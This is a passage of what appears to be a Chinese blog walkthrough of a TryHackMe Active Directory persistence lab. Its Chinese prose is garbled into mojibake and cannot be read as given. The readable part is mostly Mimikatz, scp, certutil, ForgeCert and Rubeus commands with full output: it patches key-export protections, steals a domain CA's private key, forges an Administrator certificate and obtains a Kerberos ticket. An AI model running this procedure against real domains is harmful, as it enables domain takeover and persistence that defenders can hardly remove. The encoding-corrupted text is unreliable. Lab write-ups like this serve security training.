ä¸ºå®ƒå…è®¸æ–‡ä»¶è®¿é—®ã€‚ /ptt - è¯¥æ ‡å¿—å‘Šè¯‰ Mimikatz å°†ç¥¨è¯ç›´æ¥æ³¨å…¥ä¼šè¯ä¸­ï¼Œè¿™æ„å‘³ç€å®ƒå·²å‡†å¤‡å¥½ä½¿ç”¨ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹ THMSERVER1 è¿è¡Œ dir å‘½ä»¤æ¥éªŒè¯é“¶ç¥¨æ˜¯å¦æ­£å¸¸å·¥ä½œï¼š dir \\\\thmserver1.za.tryhackme.loc\\c$\\ 0x04 é€šè¿‡è¯ä¹¦è¿›è¡ŒæŒä¹…åŒ– è¿™é‡Œæœ‰ä¸€ä¸ªå¿«é€Ÿè¯´æ˜ã€‚ä»ç°åœ¨å¼€å§‹è®¨è®ºçš„æŠ€æœ¯å…·æœ‰ä»¤äººéš¾ä»¥ç½®ä¿¡çš„ä¾µå…¥æ€§å¹¶ä¸”éš¾ä»¥æ¶ˆé™¤ã€‚å³ä½¿æ‚¨å·²æ‰¹å‡†çº¢é˜Ÿç»ƒä¹ æ¥æ‰§è¡Œè¿™äº›æŠ€æœ¯ï¼Œæ‚¨åœ¨æ‰§è¡Œè¿™äº›æŠ€æœ¯æ—¶ä¹Ÿå¿…é¡»æ ¼å¤–å°å¿ƒã€‚åœ¨ç°å®åœºæ™¯ä¸­ï¼Œåˆ©ç”¨å¤§å¤šæ•°è¿™äº›æŠ€æœ¯å°†å¯¼è‡´å®Œæ•´çš„åŸŸé‡å»ºã€‚ç¡®ä¿æ‚¨å®Œå…¨äº†è§£ä½¿ç”¨è¿™äº›æŠ€æœ¯çš„åæœï¼Œå¹¶ä¸”ä»…åœ¨æ‚¨çš„è¯„ä¼°äº‹å…ˆè·å¾—æ‰¹å‡†å¹¶ä¸”è®¤ä¸ºæœ‰å¿…è¦æ—¶æ‰æ‰§è¡Œè¿™äº›æŠ€æœ¯ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œçº¢é˜Ÿæ¼”ä¹ æ­¤æ—¶å°†è¢«å–æ¶ˆï¼Œè€Œä¸æ˜¯ä½¿ç”¨è¿™äº›æŠ€æœ¯ã€‚è¿™æ„å‘³ç€æ‚¨å¾ˆå¯èƒ½ä¸ä¼šæ‰§è¡Œè¿™äº›æŒä¹…æ€§æŠ€æœ¯ï¼Œè€Œæ˜¯æ¨¡æ‹Ÿå®ƒä»¬ã€‚ æœ€åä¸¤ç§æŒä¹…æ€§æŠ€æœ¯ä¾èµ–äºå‡­æ®ã€‚è™½ç„¶æˆ‘ä»¬è‚¯å®šå¯ä»¥è®©è“é˜Ÿçš„ç”Ÿæ´»å˜å¾—å¤æ‚ï¼Œä½†ä»–ä»¬æœ€ç»ˆå¯ä»¥è½®æ¢è¶³å¤Ÿçš„å‡­æ®æ¥å°†æˆ‘ä»¬è¸¢å‡ºå»ã€‚å› æ­¤ï¼Œè™½ç„¶è¿™äº›æŠ€æœ¯åœ¨è®©è“é˜Ÿå¿™ç¢Œçš„åŒæ—¶ä¿æŒç€å®ƒä»¬çš„å¿™ç¢Œå¾ˆå¥½ï¼Œä½†æˆ‘ä»¬åº”è¯¥å¯»æ‰¾ä½¿ç”¨ä¸ä¾èµ–å‡­æ®çš„æŒä¹…æ€§æŠ€æœ¯ï¼Œè¿™æ„å‘³ç€è¿™äº›å‡­æ®çš„è½®æ¢ä¸ä¼šå°†æˆ‘ä»¬è¸¢å‡ºå»ã€‚æˆ‘ä»¬å°†é¦–å…ˆçœ‹çœ‹çš„æ˜¯è¯ä¹¦ã€‚ AD CSå›å½’ åœ¨åˆ©ç”¨ AD å®¤ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨è¯ä¹¦æˆä¸ºåŸŸç®¡ç†å‘˜ã€‚ä½†æ˜¯ï¼Œè¯ä¹¦ä¹Ÿå¯ç”¨äºæŒä¹…æ€§ã€‚æˆ‘ä»¬æ‰€éœ€è¦çš„åªæ˜¯ä¸€ä¸ªå¯ç”¨äºå®¢æˆ·ç«¯èº«ä»½éªŒè¯çš„æœ‰æ•ˆè¯ä¹¦ã€‚è¿™å°†å…è®¸æˆ‘ä»¬ä½¿ç”¨è¯ä¹¦æ¥è¯·æ±‚ TGTã€‚è¿™æœ‰ä»€ä¹ˆç¾æ„Ÿï¼Ÿæˆ‘ä»¬å¯ä»¥ç»§ç»­è¯·æ±‚ TGTï¼Œæ— è®ºä»–ä»¬åœ¨æˆ‘ä»¬æ”»å‡»çš„è´¦æˆ·ä¸Šè¿›è¡Œäº†å¤šå°‘è½®æ¢ã€‚æˆ‘ä»¬è¢«è¸¢å‡ºçš„å”¯ä¸€æ–¹æ³•æ˜¯ä»–ä»¬æ’¤é”€æˆ‘ä»¬ç”Ÿæˆçš„è¯ä¹¦æˆ–è€…è¯ä¹¦è¿‡æœŸã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯èƒ½åœ¨æ¥ä¸‹æ¥çš„å¤§çº¦ 5 å¹´é‡Œé»˜è®¤æ‹¥æœ‰æŒä¹…è®¿é—®æƒé™ã€‚ å¦‚æœæ‚¨æœ‰å…´è¶£äº†è§£æœ‰å…³è¯·æ±‚è¯ä¹¦å¹¶å°†å…¶ç”¨äº Kerberos èº«ä»½éªŒè¯çš„æœ€æ–°ä¿¡æ¯ï¼Œè¯·è½¬åˆ°åˆ©ç”¨ AD æˆ– AD è¯ä¹¦æ¨¡æ¿å®¤ã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªæˆ¿é—´é‡Œï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰é—²é€›ã€‚æˆ‘ä»¬æ­£åœ¨è¿½æŸ¥è¯ä¹¦é¢å‘æœºæ„ (CA) æœ¬èº«ã€‚ æ ¹æ®æˆ‘ä»¬çš„è®¿é—®æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥å†è¿›ä¸€æ­¥ã€‚æˆ‘ä»¬å¯ä»¥ç®€å•åœ°çªƒå–æ ¹ CA è¯ä¹¦çš„ç§é’¥ï¼Œä»¥ä¾¿åœ¨ä»»ä½•æ—¶å€™ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„è¯ä¹¦ã€‚æ›´ç³Ÿç³•çš„æ˜¯ï¼Œç”±äºè¿™äº›è¯ä¹¦ä»æœªè¢« CA é¢å‘ï¼Œå› æ­¤è“é˜Ÿæ— æ³•æ’¤é”€å®ƒä»¬ã€‚å¯¹äºè“é˜Ÿæ¥è¯´ï¼Œè¿™å°†æ˜¯æ›´ç³Ÿç³•çš„æƒ…å†µï¼Œå› ä¸ºè¿™æ„å‘³ç€CAçš„è½®æ¢ï¼Œè¿™æ„å‘³ç€è“é˜Ÿå¿…é¡»æ’¤é”€æ‰€æœ‰å·²ç»é¢å‘çš„è¯ä¹¦æ‰èƒ½å°†æˆ‘ä»¬è¸¢å‡ºå»ã€‚æƒ³è±¡ä¸€ä¸‹ï¼Œä½ åˆšåˆšèŠ±äº†ä¸¤å¤©çš„æ—¶é—´æ‰§è¡Œäº†åŸŸæ¥ç®¡ï¼Œè½®æ¢äº†æ¯ä¸ªç‰¹æƒå¸æˆ·çš„å‡­æ®ï¼Œé‡ç½®äº†æ‰€æœ‰çš„é»„é‡‘å’Œç™½é“¶ç¥¨æ®ï¼Œåªæ˜¯ä¸ºäº†æ„è¯†åˆ°æ”»å‡»è€…é€šè¿‡æˆä¸ºä½ çš„ CA è€ŒæŒç»­å­˜åœ¨ã€‚ç³Ÿç³•ï¼ æå–ç§é’¥ CAçš„ç§é’¥å­˜å‚¨åœ¨CAæœåŠ¡å™¨æœ¬èº«ä¸Šã€‚å¦‚æœç§é’¥æœªé€šè¿‡åŸºäºç¡¬ä»¶çš„ä¿æŠ¤æ–¹æ³•ï¼ˆä¾‹å¦‚ç¡¬ä»¶å®‰å…¨æ¨¡å— (HSM)ï¼‰è¿›è¡Œä¿æŠ¤ï¼ˆå¯¹äºä»…å°† Active Directory è¯ä¹¦æœåŠ¡ (AD CS) ç”¨äºå†…éƒ¨ç›®çš„çš„ç»„ç»‡æ¥è¯´é€šå¸¸æ˜¯è¿™ç§æƒ…å†µï¼‰ï¼Œåˆ™å®ƒä¼šå—åˆ°æœºå™¨æ•°æ®ä¿æŠ¤ API (DPAPI)ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Mimikatz å’Œ SharpDPAPI ç­‰å·¥å…·æ¥æå– CA è¯ä¹¦ï¼Œä»è€Œä» CA ä¸­æå–ç§é’¥ã€‚ Mimikatz æ˜¯ä½¿ç”¨æœ€ç®€å•çš„å·¥å…·ï¼Œä½†å¦‚æœæ‚¨æƒ³ä½“éªŒå…¶ä»–å·¥å…·ï¼Œè¯·çœ‹çœ‹è¿™é‡Œã€‚ä½¿ç”¨ä»»åŠ¡ 2 ä¸­çš„ç®¡ç†å‘˜å‡­æ®ä½¿ç”¨ SSH å¯¹ THMDC.za.tryhackme.loc è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¸ºæ‚¨çš„ç”¨æˆ·åˆ›å»ºä¸€ä¸ªå”¯ä¸€çš„ç›®å½•ï¼Œç§»è‡³è¯¥ç›®å½•å¹¶åŠ è½½ Mimikatzï¼š æˆ‘ä»¬å…ˆçœ‹çœ‹èƒ½å¦æŸ¥çœ‹åˆ°DCä¸Šå­˜å‚¨çš„è¯ä¹¦ï¼š mimikatz # crypto::certificates /systemstore:local_machine * System Store : 'local_machine' (0x00020000) * Store : 'My' 0. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 040000000000703a4d78090a0ab10400000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39 Key Container : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f |Unique name : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO 1. za-THMDC-CA Subject : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 90e157dae304ef429824a33d3a3ef91e Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 6:58:15 PM -&gt; 4/27/2027 7:08:09 PM Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e Key Container : za-THMDC-CA Provider : Microsoft Software Key Storage Provider Provider type : cng (0) Type : CNG Key (0xffffffff) |Provider name : Microsoft Software Key Storage Provider |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ; Key Container : za-THMDC-CA Unique name : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Algorithm : RSA Key size : 2048 (0x00000800) Export policy : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) Exportable key : YES LSA isolation : NO 2. THMDC.za.tryhackme.loc Subject : CN=THMDC.za.tryhackme.loc Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 03000000000057c6f9be06e7c78d0300000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42 Key Container : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c |Unique name : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO 3. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 02000000000078856466521a82570200000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:18 PM -&gt; 4/27/2023 7:32:18 PM Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a Key Container : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 |Unique name : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO æˆ‘ä»¬å¯ä»¥çœ‹åˆ°DCä¸Šæœ‰CAè¯ä¹¦ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æ³¨æ„åˆ°ï¼Œå…¶ä¸­ä¸€äº›è¯ä¹¦è¢«è®¾ç½®ä¸ºä¸å…è®¸æˆ‘ä»¬å¯¼å‡ºå¯†é’¥ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªç§é’¥ï¼Œæˆ‘ä»¬å°†æ— æ³•ç”Ÿæˆæ–°çš„è¯ä¹¦ã€‚å¹¸è¿çš„æ˜¯ï¼ŒMimikatz å…è®¸æˆ‘ä»¬ä¿®è¡¥å†…å­˜ä»¥ä½¿è¿™äº›å¯†é’¥å¯å¯¼å‡ºï¼š mimikatz # privilege::debug Privilege '20' OK mimikatz # crypto::capi Local CryptoAPI RSA CSP patched Local CryptoAPI DSS CSP patched mimikatz # crypto::cng \"KeyIso\" service patched å¦‚æœæ‚¨æ”¶åˆ°é”™è¯¯ï¼Œè¯·ä¸è¦æ‹…å¿ƒï¼Œè¿™åªæ˜¯æ„å‘³ç€å…¶ä»–äººåœ¨æ‚¨ä¹‹å‰æ‰§è¡Œäº†è¯¥è¡¥ä¸ã€‚ä¿®è¡¥è¿™äº›æœåŠ¡åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Mimikatz å¯¼å‡ºè¯ä¹¦ï¼š mimikatz # crypto::certificates /systemstore:local_machine /export * System Store : 'local_machine' (0x00020000) * Store : 'My' 0. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 040000000000703a4d78090a0ab10400000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39 Key Container : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f |Unique name : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO Public export : OK - 'local_machine_My_0_.der' Private export : OK - 'local_machine_My_0_.pfx' 1. za-THMDC-CA Subject : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 90e157dae304ef429824a33d3a3ef91e Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 6:58:15 PM -&gt; 4/27/2027 7:08:09 PM Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e Key Container : za-THMDC-CA Provider : Microsoft Software Key Storage Provider Provider type : cng (0) Type : CNG Key (0xffffffff) |Provider name : Microsoft Software Key Storage Provider |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ; Key Container : za-THMDC-CA Unique name : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Algorithm : RSA Key size : 2048 (0x00000800) Export policy : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; ) Exportable key : YES LSA isolation : NO Public export : OK - 'local_machine_My_1_za-THMDC-CA.der' Private export : OK - 'local_machine_My_1_za-THMDC-CA.pfx' 2. THMDC.za.tryhackme.loc Subject : CN=THMDC.za.tryhackme.loc Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 03000000000057c6f9be06e7c78d0300000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:43 PM -&gt; 4/27/2023 7:32:43 PM Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42 Key Container : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c |Unique name : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO Public export : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.der' Private export : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.pfx' 3. Subject : Issuer : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA Serial : 02000000000078856466521a82570200000010 Algorithm: 1.2.840.113549.1.1.1 (RSA) Validity : 4/27/2022 7:32:18 PM -&gt; 4/27/2023 7:32:18 PM Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a Key Container : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 Provider : Microsoft RSA SChannel Cryptographic Provider Provider type : RSA_SCHANNEL (12) Type : AT_KEYEXCHANGE (0x00000001) |Provider name : Microsoft RSA SChannel Cryptographic Provider |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609 |Unique name : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1 |Implementation: CRYPT_IMPL_SOFTWARE ; Algorithm : CALG_RSA_KEYX Key size : 2048 (0x00000800) Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; ) Exportable key : NO Public export : OK - 'local_machine_My_3_.der' Private export : OK - 'local_machine_My_3_.pfx' å¯¼å‡ºçš„è¯ä¹¦å°†ä»¥ PFX å’Œ DER æ ¼å¼å­˜å‚¨åˆ°ç£ç›˜ï¼š za-THMDC-CA.pfx è¯ä¹¦æ˜¯æˆ‘ä»¬ç‰¹åˆ«æ„Ÿå…´è¶£çš„è¯ä¹¦ã€‚ä¸ºäº†å¯¼å‡ºç§é’¥ï¼Œå¿…é¡»ä½¿ç”¨å¯†ç æ¥åŠ å¯†è¯ä¹¦ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMimikatz åˆ†é…çš„å¯†ç ä¸º mimikatz ã€‚ä½¿ç”¨ SCP ä¸‹è½½æˆ–å¤åˆ¶æ­¤è¯ä¹¦åˆ°æ‚¨çš„ AttackBoxï¼Œç„¶åå°†å…¶å¤åˆ¶åˆ° THMWRK1 ä¸Šçš„ä½æƒé™ç”¨æˆ·çš„ä¸»ç›®å½•ã€‚å¦‚æœæ‚¨æ„¿æ„ï¼Œè¿˜å¯ä»¥åœ¨è‡ªå·±çš„æœªåŠ å…¥åŸŸçš„ Windows è®¡ç®—æœºä¸Šæ‰§è¡Œå…¶ä½™æ­¥éª¤ã€‚ è¿™é‡Œæˆ‘ä¸çŸ¥ä¸ºä½•æˆ‘æ²¡æœ‰za-THMDC-CA.pfxè¯ä¹¦ï¼Œå¼„äº†åŠå¤©æ˜¯æˆ‘sshè¿æ¥å¯¹è±¡æé”™äº† ç”Ÿæˆæˆ‘ä»¬è‡ªå·±çš„è¯ä¹¦ ç°åœ¨æˆ‘ä»¬æœ‰äº†ç§é’¥å’Œæ ¹ CA è¯ä¹¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SpectorOps ForgeCert å·¥å…·ä¸ºæˆ‘ä»¬æƒ³è¦çš„ä»»ä½•ç”¨æˆ·ä¼ªé€ å®¢æˆ·ç«¯èº«ä»½éªŒè¯è¯ä¹¦ã€‚ ForgeCert å’Œ Rubeus äºŒè¿›åˆ¶æ–‡ä»¶å­˜å‚¨åœ¨ THMWRK1 ä¸Šçš„ C:\\Tools\\ ç›®å½•ä¸­ã€‚è®©æˆ‘ä»¬ä½¿ç”¨ ForgeCert ç”Ÿæˆä¸€ä¸ªæ–°è¯ä¹¦ï¼š è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†ä¸Šè¿°çš„pfxæ–‡ä»¶ä¼ è¾“åˆ°æˆ‘ä»¬çš„attackboxä¸Š scp Administrator@thmdc.za.tryhackme.loc:C:/Users/Administrator/hybcx/local_machine_My_1_za-THMDC-CA.pfx . æ¥ç€sshè¿æ¥è¯¥åŸŸç¯å¢ƒçš„thmwrkè®¡ç®—æœºï¼Œå°†è¯¥pfxæ–‡ä»¶ä¼ è¾“è‡³è¯¥è®¡ç®—æœºä¸Š certutil -urlcache -f http://10.50.59.120:8000/za-THMDC-CA.pfx za-THMDC-CA.pfx æ¥ä¸‹æ¥ä½¿ç”¨å·¥å…·ç”Ÿæˆè¯ä¹¦ C:\\Tools\\ForgeCert\\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath hybcx.pfx --NewCertPassword Password123 å‚æ•°è§£é‡Šï¼š CaCertPath - æˆ‘ä»¬å¯¼å‡ºçš„ CA è¯ä¹¦çš„è·¯å¾„ã€‚ CaCertPassword - ç”¨äºåŠ å¯†è¯ä¹¦çš„å¯†ç ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒMimikatz åˆ†é…çš„å¯†ç ä¸º mimikatz ã€‚ Subject - è¯ä¹¦çš„ä¸»é¢˜æˆ–é€šç”¨åç§°ã€‚å¯¹äºæˆ‘ä»¬ä½¿ç”¨è¯ä¹¦çš„ç”¨é€”è€Œè¨€ï¼Œè¿™å¹¶ä¸é‡è¦ã€‚ subjectAltName - è¿™æ˜¯æˆ‘ä»¬è¦ä½¿ç”¨æ­¤è¯ä¹¦æ¨¡æ‹Ÿçš„å¸æˆ·çš„ç”¨æˆ·ä¸»ä½“åç§° (UPN)ã€‚å®ƒå¿…é¡»æ˜¯åˆæ³•ç”¨æˆ·ã€‚ NewCertPath - ForgeCert å°†å­˜å‚¨ç”Ÿæˆçš„è¯ä¹¦çš„è·¯å¾„ã€‚ NewCertPassword - ç”±äºè¯ä¹¦éœ€è¦å¯¼å‡ºç§é’¥ç”¨äºèº«ä»½éªŒè¯ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»è®¾ç½®ä¸€ä¸ªç”¨äºåŠ å¯†å®ƒçš„æ–°å¯†ç ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Rubeus æ¥ä½¿ç”¨è¯ä¹¦è¯·æ±‚ TGTï¼Œä»¥éªŒè¯è¯ä¹¦æ˜¯å¦å¯ä¿¡ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:hybcx.pfx /password:Password123 /outfile:fullAdmin.kirbi /domain:za.tryhackme.loc /dc:10.200.62.101 æˆ‘ä»¬æ¥åˆ†è§£ä¸€ä¸‹å‚æ•°ï¼š /user - è¿™æŒ‡å®šæˆ‘ä»¬å°†æ¨¡æ‹Ÿçš„ç”¨æˆ·ï¼Œå¹¶ä¸”å¿…é¡»ä¸æˆ‘ä»¬ç”Ÿæˆçš„è¯ä¹¦çš„ UPN ç›¸åŒ¹é… /enctype - æŒ‡å®šç¥¨è¯çš„åŠ å¯†ç±»å‹ã€‚è®¾ç½®æ­¤é¡¹å¯¹äºè§„é¿å¾ˆé‡è¦ï¼Œå› ä¸ºé»˜è®¤åŠ å¯†ç®—æ³•å¾ˆå¼±ï¼Œè¿™ä¼šå¯¼è‡´æº¢å‡ºè­¦æŠ¥ /certificate - æˆ‘ä»¬ç”Ÿæˆçš„è¯ä¹¦çš„è·¯å¾„ /password - æˆ‘ä»¬çš„è¯ä¹¦æ–‡ä»¶çš„å¯†ç  /outfile - TGT å°†è¾“å‡ºåˆ°çš„æ–‡ä»¶ /domain - æˆ‘ä»¬å½“å‰æ”»å‡»çš„åŸŸçš„ FQDN /dc - æˆ‘ä»¬è¯·æ±‚ TGT çš„åŸŸæ§åˆ¶å™¨çš„ IPã€‚é€šå¸¸ï¼Œæœ€å¥½é€‰æ‹©è¿è¡ŒCAæœåŠ¡çš„DC æ‰§è¡Œå‘½ä»¤åï¼Œæˆ‘ä»¬åº”è¯¥ä¼šæ”¶åˆ° TGTï¼š ä½†è¿™é‡Œæˆ‘æ€»æ˜¯æŠ¥é”™ï¼Œå¦‚ä¸‹å›¾ è¿™é‡Œç»è¿‡å‡ ç¯‡æ–‡ç« çš„æœå¯»ï¼Œè¯¥æŠ¥é”™åŸå› æ˜¯ç”±äºå…¶ä¸æ”¯æŒpadataç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯¥KDCæ²¡æœ‰è®¾ç½®kerberosèº«ä»½éªŒè¯ã€‚è¿™é‡Œä¹Ÿæ˜¯æ‡µé€¼äº†ï¼Œå°è¯•å‡ æ¬¡éƒ½å¤±è´¥ï¼Œæ„Ÿè§‰æ˜¯ç¯å¢ƒé—®é¢˜ï¼Œä½†åˆšé‡ç½®äº†è¿˜æ˜¯å‡ºé”™ï¼Œä¸ç†è§£ï¼Œå°±å…ˆæ”¾å‡ºæˆæœå›¾ za\\aaron.jones@THMWRK1 C:\\Users\\aaron.jones&gt;C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101 ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.0.0 [*] Action: Ask TGT [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert [*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\\Administrator' [+] TGT request successful! [*] base64(ticket.kirbi): doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/ MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr 2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW 